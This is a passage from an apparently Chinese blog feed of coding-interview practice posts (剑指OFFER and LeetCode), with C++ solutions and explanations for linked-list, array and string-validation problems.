<li><p>算法<br>(二路归并) O(n)O(n)<br>新建头部的保护结点dummy，设置cur指针指向dummy。<br>若当前l1指针指向的结点的值val比l2指针指向的结点的值val小，则令cur的next指针指向l1，且l1后移；否则指向l2，且l2后移。<br>然后cur指针按照上一部设置好的位置后移。<br>循环以上步骤直到l1或l2为空。<br>将剩余的l1或l2接到cur指针后边。<br>时间复杂度<br>两个链表各遍历一次，所以时间复杂度为O(n)</p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">&#x2F;**
 * Definition for singly-linked list.
 * struct ListNode &#123;
 *     int val;
 *     ListNode *next;
 *     ListNode(int x) : val(x), next(NULL) &#123;&#125;
 * &#125;;
 *&#x2F;
class Solution &#123;
public:
    ListNode* merge(ListNode* l1, ListNode* l2) &#123;
        ListNode *dummy &#x3D; new ListNode(0);
        ListNode *cur &#x3D; dummy;
        while (l1 !&#x3D; NULL &amp;&amp; l2 !&#x3D; NULL) &#123;
            if (l1 -&gt; val &lt; l2 -&gt; val) &#123;
                cur -&gt; next &#x3D; l1;
                l1 &#x3D; l1 -&gt; next;
            &#125;
            else &#123;
                cur -&gt; next &#x3D; l2;
                l2 &#x3D; l2 -&gt; next;
            &#125;
            cur &#x3D; cur -&gt; next;
        &#125;
        cur -&gt; next &#x3D; (l1 !&#x3D; NULL ? l1 : l2);
        return dummy -&gt; next;
    &#125;
&#125;;

<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>剑指OFFER 22.反转链表</title>
    <url>/2021/03/28/%E5%89%91%E6%8C%87OFFER-22-%E5%8F%8D%E8%BD%AC%E9%93%BE%E8%A1%A8/</url>
    <content><![CDATA[<p>剑指OFFER 22.反转链表</p>
<ul>
<li>22.反转链表</li>
</ul>
<a id="more"></a>

<ul>
<li><p>定义一个函数，输入一个链表的头结点，反转该链表并输出反转后链表的头结点。</p>
<p> <strong>思考题：</strong></p>
<ul>
<li><p>请同时实现迭代版本和递归版本。</p>
<h4 id="样例"><a href="#样例" class="headerlink" title="样例"></a>样例</h4><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">输入:1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;NULL

输出:5-&gt;4-&gt;3-&gt;2-&gt;1-&gt;NULL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

</li>
</ul>
</li>
</ul>
<p><img src="https://media.geeksforgeeks.org/wp-content/cdn-uploads/RGIF2.gif" alt="img"></p>
<p><img src="https://media.geeksforgeeks.org/wp-content/cdn-uploads/RGIF2.gif" alt="img"></p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">&#x2F;**
 * Definition for singly-linked list.
 * struct ListNode &#123;
 *     int val;
 *     ListNode *next;
 *     ListNode(int x) : val(x), next(NULL) &#123;&#125;
 * &#125;;
 *&#x2F;
class Solution &#123;
public:
    ListNode* reverseList(ListNode* head) &#123;
        &#x2F;&#x2F; 记录前驱结点
        ListNode* pre &#x3D; nullptr;
        auto cur &#x3D; head;
        while(cur)
        &#123;
            auto next &#x3D; cur-&gt;next;
            cur-&gt;next &#x3D; pre;
            pre &#x3D; cur;
            cur &#x3D; next;
        &#125;  
        return pre;
    &#125;
&#125;;

<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; 迭代做法
  &#x2F;&#x2F; Iterative C++ program to reverse 
  &#x2F;&#x2F; a linked list 
  #include &lt;iostream&gt; 
  using namespace std; 

  &#x2F;* Link list node *&#x2F;
  struct Node &#123; 
      int data; 
      struct Node* next; 
      Node(int data) 
      &#123; 
          this-&gt;data &#x3D; data; 
          next &#x3D; NULL; 
      &#125; 
  &#125;; 

  struct LinkedList &#123; 
      Node* head; 
      LinkedList() 
      &#123; 
          head &#x3D; NULL; 
      &#125; 

      &#x2F;* Function to reverse the linked list *&#x2F;
      void reverse() 
      &#123; 
          &#x2F;&#x2F; Initialize current, previous and 
          &#x2F;&#x2F; next pointers 
          Node* current &#x3D; head; 
          Node *prev &#x3D; NULL, *next &#x3D; NULL; 

          while (current !&#x3D; NULL) &#123; 
              &#x2F;&#x2F; Store next 
              next &#x3D; current-&gt;next; 

              &#x2F;&#x2F; Reverse current node&#39;s pointer 
              current-&gt;next &#x3D; prev; 

              &#x2F;&#x2F; Move pointers one position ahead. 
              prev &#x3D; current; 
              current &#x3D; next; 
          &#125; 
          head &#x3D; prev; 
      &#125; 

      &#x2F;* Function to print linked list *&#x2F;
      void print() 
      &#123; 
          struct Node* temp &#x3D; head; 
          while (temp !&#x3D; NULL) &#123; 
              cout &lt;&lt; temp-&gt;data &lt;&lt; &quot; &quot;; 
              temp &#x3D; temp-&gt;next; 
          &#125; 
      &#125; 

      void push(int data) 
      &#123; 
          Node* temp &#x3D; new Node(data); 
          temp-&gt;next &#x3D; head; 
          head &#x3D; temp; 
      &#125; 
  &#125;; 

  &#x2F;* Driver program to test above function*&#x2F;
  int main() 
  &#123; 
      &#x2F;* Start with the empty list *&#x2F;
      LinkedList ll; 
      ll.push(20); 
      ll.push(4); 
      ll.push(15); 
      ll.push(85); 

      cout &lt;&lt; &quot;Given linked list\n&quot;; 
      ll.print(); 

      ll.reverse(); 

      cout &lt;&lt; &quot;\nReversed Linked list \n&quot;; 
      ll.print(); 
      return 0; 
  &#125; 

<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
  </entry>
  <entry>
    <title>剑指OFFER 21.链表中环的入口结点</title>
    <url>/2021/03/28/%E5%89%91%E6%8C%87OFFER-21-%E9%93%BE%E8%A1%A8%E4%B8%AD%E7%8E%AF%E7%9A%84%E5%85%A5%E5%8F%A3%E7%BB%93%E7%82%B9/</url>
    <content><![CDATA[<p>链表中环的入口结点</p>
<a id="more"></a>
<pre class="line-numbers language-none"><code class="language-none">给定一个链表，若其中包含环，则输出环的入口节点。

若其中不包含环，则输出&#96;null&#96;。

#### 样例
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://www.acwing.com/media/article/image/2018/12/02/19_69ba6d14f5-QQ%E6%88%AA%E5%9B%BE20181202023846.png" alt="QQ截图20181202023846.png"></p>
<pre class="line-numbers language-none"><code class="language-none">
&#96;&#96;&#96;c++
给定如上所示的链表：
[1, 2, 3, 4, 5, 6]
2
注意，这里的2表示编号是2的节点，节点编号从0开始。所以编号是2的节点就是val等于3的节点。

则输出环的入口节点3.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>






<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">
class Solution &#123;
public:
    ListNode *entryNodeOfLoop(ListNode *head) 
    &#123;
    	 ListNode *h1&#x3D;head,*h2&#x3D;head;
    	 if(!head ||!head-&gt;next)
    	 	return NULL;
    	 while(h1 &amp;&amp; h2)
    	 &#123;
    	 	h1&#x3D;h1-&gt;next;
    	 	h2&#x3D;h2-&gt;next;
    	 	if(h2)
    	 		h2&#x3D;h2-&gt;next;
    	 	else return NULL;
    	 	if(h1&#x3D;&#x3D;h2)
    	 	&#123;
    	 		h1&#x3D;head;
    	 		while(h1!&#x3D;h2)
    	 		&#123;
    	 			h1&#x3D;h1-&gt;next;
    	 			h2&#x3D;h2-&gt;next;
    	 		&#125;
    	 		return h1;
    	 	&#125;
    	 &#125;
    	 return NULL;   
    &#125;
&#125;;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">算法
(链表，快慢指针扫描) O(n)O(n)
本题的做法比较巧妙。
用两个指针 first,secondfirst,second 分别从起点开始走，firstfirst 每次走一步，secondsecond 每次走两步。
如果过程中 secondsecond 走到null，则说明不存在环。否则当 firstfirst 和 secondsecond 相遇后，让 firstfirst 返回起点，secondsecond 待在原地不动，然后两个指针每次分别走一步，当相遇时，相遇点就是环的入口。



证明：如上图所示，aa 是起点，bb 是环的入口，cc 是两个指针的第一次相遇点，abab 之间的距离是 xx，bcbc 之间的距离是 yy。
则当 firstfirst 走到 bb 时，由于 secondsecond 比 firstfirst 多走一倍的路，所以 secondsecond 已经从 bb 开始在环上走了 xx 步，可能多余1圈，距离 bb 还差 yy 步（这是因为第一次相遇点在 bb 之后 yy 步，我们让 firstfirst 退回 bb 点，则 secondsecond 会退 2y2y 步，也就是距离 bb 点还差 yy 步）；所以 secondsecond 从 bb 点走 x+yx+y 步即可回到 bb 点，所以 secondsecond 从 cc 点开始走，走 xx 步即可恰好走到 bb 点，同时让 firstfirst 从头开始走，走 xx 步也恰好可以走到 bb 点。所以第二次相遇点就是 bb 点。

另外感谢@watay147提供的另一种思路，可以用公式来说明：a,b,c,x,ya,b,c,x,y 的含义同上，我们用 zz 表示从 cc 点顺时针走到 bb 的距离。则第一次相遇时 secondsecond 所走的距离是 x+(y+z)∗n+yx+(y+z)∗n+y, nn 表示圈数，同时 secondsecond 走过的距离是 firstfirst 的两倍，也就是 2(x+y)2(x+y)，所以我们有 x+(y+z)∗n+y&#x3D;2(x+y)x+(y+z)∗n+y&#x3D;2(x+y)，所以 x&#x3D;(n−1)×(y+z)+zx&#x3D;(n−1)×(y+z)+z。那么我们让 secondsecond 从 cc 点开始走，走 xx 步，会恰好走到 bb 点；让 firstfirst 从 aa 点开始走，走 xx 步，也会走到 bb 点。

时间复杂度
firstfirst 总共走了 2x+y2x+y 步，secondsecond 总共走了 2x+2y+x2x+2y+x 步，所以两个指针总共走了 5x+3y5x+3y 步。由于当第一次 firstfirst 走到 bb 点时，secondsecond 最多追一圈即可追上 firstfirst，所以 yy 小于环的长度，所以 x+yx+y 小于等于链表总长度。所以总时间复杂度是 O(n)O(n)。

C++ 代码
&#x2F;**

 * Definition for singly-linked list.

 * struct ListNode &#123;

 * int val;

 * ListNode *next;

 * ListNode(int x) : val(x), next(NULL) &#123;&#125;

 * &#125;;
   *&#x2F;
   class Solution &#123;
   public:
   ListNode *entryNodeOfLoop(ListNode *head) &#123;
       if (!head || !head-&gt;next) return 0;
       ListNode *first &#x3D; head, *second &#x3D; head;

       while (first &amp;&amp; second)
       &#123;
           first &#x3D; first-&gt;next;
           second &#x3D; second-&gt;next;
           if (second) second &#x3D; second-&gt;next;
           else return 0;
       
           if (first &#x3D;&#x3D; second)
           &#123;
               first &#x3D; head;
               while (first !&#x3D; second)
               &#123;
                   first &#x3D; first-&gt;next;
                   second &#x3D; second-&gt;next;
               &#125;
               return first;
           &#125;
       &#125;
       
       return 0;

   &#125;
   &#125;;

<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
  </entry>
  <entry>
    <title>剑指OFFER 20.链表中倒数第k个节点</title>
    <url>/2021/03/28/%E5%89%91%E6%8C%87OFFER-20-%E9%93%BE%E8%A1%A8%E4%B8%AD%E5%80%92%E6%95%B0%E7%AC%ACk%E4%B8%AA%E8%8A%82%E7%82%B9/</url>
    <content><![CDATA[<p>链表中倒数第k个节点<br>输入一个链表，输出该链表中倒数第 k 个结点。</p>
<a id="more"></a>
<p>注意：</p>
<p>k &gt;= 1;<br>如果 k 大于链表长度，则返回 NULL;<br>样例<br>输入：链表：1-&gt;2-&gt;3-&gt;4-&gt;5 ，k=2</p>
<p>输出：4</p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">
&#x2F;**
 * Definition for singly-linked list.
 * struct ListNode &#123;
 *     int val;
 *     ListNode *next;
 *     ListNode(int x) : val(x), next(NULL) &#123;&#125;
 * &#125;;
 *&#x2F;
class Solution &#123;
public:
	int n&#x3D;0;
    ListNode* findKthToTail(ListNode* pListHead, int k) 
    &#123;

        ListNode* h&#x3D;pListHead;
        while(h)
        &#123;
        	h&#x3D;h-&gt;next;
        	n++;
        &#125;
        if(k&gt;n)
        	return NULL;
        h&#x3D;pListHead;
        for(int i&#x3D;0;i&lt;n-k;i++)
        &#123;
        	h&#x3D;h-&gt;next;
        &#125;	
        return h;
    &#125;
&#125;;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


]]></content>
  </entry>
  <entry>
    <title>剑指OFFER 19.调整数组顺序使奇数位于偶数前面</title>
    <url>/2021/03/28/%E5%89%91%E6%8C%87OFFER-19-%E8%B0%83%E6%95%B4%E6%95%B0%E7%BB%84%E9%A1%BA%E5%BA%8F%E4%BD%BF%E5%A5%87%E6%95%B0%E4%BD%8D%E4%BA%8E%E5%81%B6%E6%95%B0%E5%89%8D%E9%9D%A2/</url>
    <content><![CDATA[<p>调整数组顺序使奇数位于偶数前面</p>
<pre class="line-numbers language-none"><code class="language-none">输入一个整数数组，实现一个函数来调整该数组中数字的顺序。

使得所有的奇数位于数组的前半部分，所有的偶数位于数组的后半部分。

样例
输入：[1,2,3,4,5]

输出: [1,3,5,2,4]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-C++" data-language="C++"><code class="language-C++">
class Solution &#123;
public:
    void reOrderArray(vector&lt;int&gt; &amp;array) 
    &#123;
    	int i&#x3D;0,j&#x3D;array.size()-1;
    	while(i&lt;j)
    	&#123;
    		while(i&lt;j &amp;&amp; array[i]%2&#x3D;&#x3D;1) i++;
    		while(i&lt;j &amp;&amp; array[j]%2&#x3D;&#x3D;0) j--;
    		if(i&lt;j) swap(array[i],array[j]);
    	&#125;
    &#125;
&#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

]]></content>
  </entry>
  <entry>
    <title>Leetcode 1588. 所有奇数长度子数组的和</title>
    <url>/2021/03/28/Leetcode-1588-%E6%89%80%E6%9C%89%E5%A5%87%E6%95%B0%E9%95%BF%E5%BA%A6%E5%AD%90%E6%95%B0%E7%BB%84%E7%9A%84%E5%92%8C/</url>
    <content><![CDATA[<p>所有奇数长度子数组的和</p>
<a id="more"></a>
<pre class="line-numbers language-none"><code class="language-none">给你一个正整数数组 arr ，请你计算所有可能的奇数长度子数组的和。

子数组 定义为原数组中的一个连续子序列。

请你返回 arr 中 所有奇数长度子数组的和 。

 

示例 1：

输入：arr &#x3D; [1,4,2,5,3]
输出：58
解释：所有奇数长度子数组和它们的和为：
[1] &#x3D; 1
[4] &#x3D; 4
[2] &#x3D; 2
[5] &#x3D; 5
[3] &#x3D; 3
[1,4,2] &#x3D; 7
[4,2,5] &#x3D; 11
[2,5,3] &#x3D; 10
[1,4,2,5,3] &#x3D; 15
我们将所有值求和得到 1 + 4 + 2 + 5 + 3 + 7 + 11 + 10 + 15 &#x3D; 58
示例 2：

输入：arr &#x3D; [1,2]
输出：3
解释：总共只有 2 个长度为奇数的子数组，[1] 和 [2]。它们的和为 3 。
示例 3：

输入：arr &#x3D; [10,11,12]
输出：66
 

提示：

1 &lt;&#x3D; arr.length &lt;&#x3D; 100
1 &lt;&#x3D; arr[i] &lt;&#x3D; 1000

来源：力扣（LeetCode）
链接：https:&#x2F;&#x2F;leetcode-cn.com&#x2F;problems&#x2F;sum-of-all-odd-length-subarrays
著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">第一想法：
class Solution &#123;
public:
    int sumOddLengthSubarrays(vector&lt;int&gt;&amp; arr) 
    &#123;
        int i,j,k;
        int sum&#x3D;0;
        for(i&#x3D;0;i&lt;arr.size();i+&#x3D;2)
        &#123;
            for(j&#x3D;0;i+j&lt;arr.size();j++)
            &#123;
                for(k&#x3D;0;k&lt;&#x3D;i;k++)
                sum+&#x3D; arr[k+j];
                
            &#125;
        &#125;
        return sum;
    &#125;
&#125;;

首先，力扣比赛第一题通常无脑暴力都能过。

我们只需要枚举所有的奇数长度的子数组即可。在下面的代码中，i 用来枚举每个连续子数组的起点，sz 为连续子数组的长度。accumulate用来计算起点是 i，长度为 sz 的子数组的和。时间复杂度是 O(n^3) 的。

我的参考代码（C++）：


class Solution &#123;
public:
    int sumOddLengthSubarrays(vector&lt;int&gt;&amp; arr) &#123;

        int res &#x3D; 0;
        for(int i &#x3D; 0; i &lt; arr.size(); i ++)
            for(int sz &#x3D; 1; i + sz - 1 &lt; arr.size(); sz +&#x3D; 2)
                res +&#x3D; accumulate(arr.begin() + i, arr.begin() + i + sz, 0);
        return res;
    &#125;
&#125;; 
我的提交结果：时间 24ms；空间 8.2 MB。

在上面的解法中，accumulate的本质就是在计算从 arr[i] 到 arr[i + sz - 1] 的连续子数组的和。计算连续子数组的和，很容想到可以使用前缀和（Prefix Sum）的方式。使用 O(n) 的时间可以预处理前缀和数组，之后使用 O(1) 的时间即可计算出一个连续子数组的和。

时间复杂度是 O(n^2) 的，空间复杂度是 O(n) 的。

我的参考代码（C++）：


class Solution &#123;
public:
    int sumOddLengthSubarrays(vector&lt;int&gt;&amp; arr) &#123;

        vector&lt;int&gt; presum &#x3D; &#123;0&#125;;
        for(int e: arr) presum.push_back(presum.back() + e);

        int res &#x3D; 0;
        for(int i &#x3D; 0; i &lt; arr.size(); i ++)
            for(int sz &#x3D; 1; i + sz - 1 &lt; arr.size(); sz +&#x3D; 2)
                res +&#x3D; presum[i + sz] - presum[i];

        return res;
    &#125;
&#125;;
我的提交结果：时间 8ms；空间 8.6 MB。

下面重点来了。这个问题有 O(n) 的解法。

其实想法很简单，相对也比较套路。就是遍历一遍所有的元素，然后查看这个元素会在多少个长度为奇数的数组中出现过。



比如题目给出的第一个测试用例 [1, 4, 2, 5, 3] 中；

1 在 3 个长度为奇数的数组中出现过：[1], [1, 4, 2], [1, 4, 2, 5, 3]；所以最终的和，要加上 1 * 3；

4 在 4 个长度为奇数的数组中出现过：[4], [4, 2, 5], [1, 4, 2], [1, 4, 2, 5, 3]；所以最终和，要加上 4 * 4；

2 在 5 个长度为奇数的数组中出现过：[2], [2, 5, 3], [4, 2, 5], [1, 4, 2], [1, 4, 2, 5, 3]；所以最终和，要加上 5 * 2；

...

下面的关键就是，如何计算一个数字在多少个奇数长度的数组中出现过？



对于一个数字，它所在的数组，可以在它前面再选择 0, 1, 2, ... 个数字，一共有 left &#x3D; i + 1 个选择；

可以在它后面再选择 0, 1, 2, ... 个数字，一共有 right &#x3D; n - i 个选择。

如果在前面选择了偶数个数字，那么在后面，也必须选择偶数个数字，这样加上它自身，才构成奇数长度的数组；

如果在前面选择了奇数个数字，那么在后面，也必须选择奇数个数字，这样加上它自身，才构成奇数长度的数组；

数字前面共有 left 个选择，其中偶数个数字的选择方案有 left_even &#x3D; (left + 1) &#x2F; 2 个，奇数个数字的选择方案有 left_odd &#x3D; left &#x2F; 2 个；

数字后面共有 right 个选择，其中偶数个数字的选择方案有 right_even &#x3D; (right + 1) &#x2F; 2 个，奇数个数字的选择方案有 right_odd &#x3D; right &#x2F; 2 个；

所以，每个数字一共在 left_even * right_even + left_odd * right_odd 个奇数长度的数组中出现过。

我的参考代码（C++）：


class Solution &#123;
public:
    int sumOddLengthSubarrays(vector&lt;int&gt;&amp; arr) &#123;

        int res &#x3D; 0;
        for(int i &#x3D; 0; i &lt; arr.size(); i ++)&#123;
            int left &#x3D; i + 1, right &#x3D; arr.size() - i,
                left_even &#x3D; (left + 1) &#x2F; 2, right_even &#x3D; (right + 1) &#x2F; 2,
                left_odd &#x3D; left &#x2F; 2, right_odd &#x3D; right &#x2F; 2;
            res +&#x3D; (left_even * right_even + left_odd * right_odd) * arr[i];
        &#125;
        return res;
    &#125;
&#125;;
我的提交结果：时间 4ms；空间 8 MB。

O(n) 的解法可以应对 10^6 乃至 10^7 的数字规模。如果这道题的数字规模是这样的，那么上面两种解法都将超时，这个问题也就变成了一个 Medium 甚至是 Hard 的问题了吧：）

* odd奇数，even偶数
* 对于每个元素i(数组中下标为i)来说，要构成奇数长度的子数组
  即 i左边的元素个数left+i本身自己一个+右边元素的个数right&#x3D;奇数
  即 left+right&#x3D;偶数
* 满足a+b&#x3D;偶数就只有两种情况
  1. 奇数+奇数&#x3D;偶数
  2. 偶数+偶数&#x3D;偶数
* 1. 所以只需要求得i左边可以选择奇数长度的可能有多少种，即left_odd,同样求右边奇数right_odd
     就可以求出策略1有多少种可能
  2. 所以只需要求得i左边可以选择偶数长度的可能有多少种，即left_odd,同样求右边偶数right_odd
     就可以求出策略1有多少种可能，注意0也算选择的一种可能
* 即元素i在所有奇数长度子数组出现的次数总和是
  left_odd*right_odd+left_even*right_even
* 元素i左边元素共有i个，右边元素共有siz-i-1个<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">class Solution &#123;
public:
&#x2F;&#x2F; 前缀和
    int sumOddLengthSubarrays(vector&lt;int&gt;&amp; arr) &#123;
        int n &#x3D; arr.size(), ans &#x3D; 0;
        vector&lt;int&gt; pre(n + 1, 0);
        for (int i &#x3D; 0; i &lt; n; ++i) &#123;
            pre[i + 1] &#x3D; pre[i] + arr[i];
        &#125;
        for (int i &#x3D; 1; i &lt;&#x3D; n; i +&#x3D; 2) &#123;
            for (int j &#x3D; 1; j &lt;&#x3D; n; ++j) &#123;
                if (j - i &gt;&#x3D; 0) ans +&#x3D; (pre[j] - pre[j - i]);
            &#125;
        &#125;
        return ans;
    &#125;
&#125;;


<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


]]></content>
  </entry>
  <entry>
    <title>剑指OFFER 18.表示数值的字符串</title>
    <url>/2021/03/28/%E5%89%91%E6%8C%87OFFER-18-%E8%A1%A8%E7%A4%BA%E6%95%B0%E5%80%BC%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
    <content><![CDATA[<p>表示数值的字符串</p>
<a id="more"></a>
<pre class="line-numbers language-none"><code class="language-none"><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>




<pre class="line-numbers language-none"><code class="language-none">判断一个字符串是否可以表示成一个合法的数字，中间可以包含正负号，小数点以及e或E

使用指针巧解表示数值的字符串
核心思想为使用一个指针从前往后逐个检查字符串中的字符是否合法，如果合法，则指针后移，否则指针停止移动，显然如果字符串是合法的，这个指针应该移动到字符串的最末尾

同时在移动指针的过程中判断从字符串开始到当前位置的字符子串是否是合法的数值，并将它存储在isNum中，显然isNum记录了指针所指位置的字符子串是否能表示为数值的信息

指针的最终位置和isNum的值决定最终的结果

class Solution &#123;
public:
    bool isNumber(string s) &#123;
        s +&#x3D; &#39;\0&#39;;   &#x2F;&#x2F;指针移动过程中，最后会有一位的溢出，加上一位空字符防止字符串下标越界
        bool isNum &#x3D; false; &#x2F;&#x2F;该变量表示从0开始，到i位置的字符串是否构成合法数字，初始化为false

        int i &#x3D; 0;  &#x2F;&#x2F;检测指针初始化为0

        while(s[i] &#x3D;&#x3D; &#39; &#39;) ++i; &#x2F;&#x2F;滤除最前面的空格，指针后移

        if(s[i] &#x3D;&#x3D; &#39;+&#39; || s[i] &#x3D;&#x3D; &#39;-&#39;) ++i; &#x2F;&#x2F;一个‘-’或‘+’为合法输入，指针后移

        while(s[i] &gt;&#x3D; &#39;0&#39; &amp;&amp; s[i] &lt;&#x3D; &#39;9&#39;)&#123;  &#x2F;&#x2F;此处如果出现数字，为合法输入，指针后移，同时isNum置为true
            isNum &#x3D; true;  &#x2F;&#x2F;显然,在此处，前面的所有字符是可以构成合法数字的
            ++i;
        &#125;

        if(s[i] &#x3D;&#x3D; &#39;.&#39;) ++i;    &#x2F;&#x2F;按照前面的顺序，在此处出现小数点也是合法的，指针后移（此处能否构成合法字符取决于isNum）

        while(s[i] &gt;&#x3D; &#39;0&#39; &amp;&amp; s[i] &lt;&#x3D; &#39;9&#39;)&#123;  &#x2F;&#x2F;小数点后出现数字也是合法的，指针后移
            isNum &#x3D; true;   &#x2F;&#x2F;无论前面是什么，此处应当是合法数字
            ++i;
        &#125;

        &#x2F;&#x2F;上面的部分已经把所有只包含小数点和正负号以及数字的情况包括进去了，如果只判断不含E或e的合法数字，到此处就可以停止了

        if(isNum &amp;&amp; (s[i] &#x3D;&#x3D; &#39;e&#39; || s[i] &#x3D;&#x3D; &#39;E&#39;))&#123; &#x2F;&#x2F;当前面的数字组成一个合法数字时（isNum &#x3D; true），此处出现e或E也是合法的
            ++i;
            isNum &#x3D; false; &#x2F;&#x2F;但到此处，E后面还没有数字，根据isNum的定义，此处的isNum应等于false;

            if(s[i] &#x3D;&#x3D; &#39;-&#39; || s[i] &#x3D;&#x3D; &#39;+&#39;) ++i; &#x2F;&#x2F;E或e后面可以出现一个‘-’或‘+’，指针后移

            while(s[i] &gt;&#x3D; &#39;0&#39; &amp; s[i] &lt;&#x3D; &#39;9&#39;) &#123;
                ++i;
                isNum &#x3D; true; &#x2F;&#x2F;E后面接上数字后也就成了合法数字
            &#125;
        &#125;

        &#x2F;&#x2F;如果字符串为合法数字，指针应当移到最后，即是s[i] &#x3D;&#x3D; &#39;\0&#39; 同时根据isNum判断数字是否合法
        &#x2F;&#x2F;整个过程中只有当i位置处的输入合法时，指针才会移动
        return (s[i] &#x3D;&#x3D; &#39;\0&#39; &amp;&amp; isNum);
    &#125;
&#125;;

<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
  </entry>
  <entry>
    <title>剑指OFFER 17.正则表达式匹配</title>
    <url>/2021/03/23/%E5%89%91%E6%8C%87OFFER-17-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%8C%B9%E9%85%8D/</url>
    <content><![CDATA[<p>正则表达式匹配</p>
<a id="more"></a>

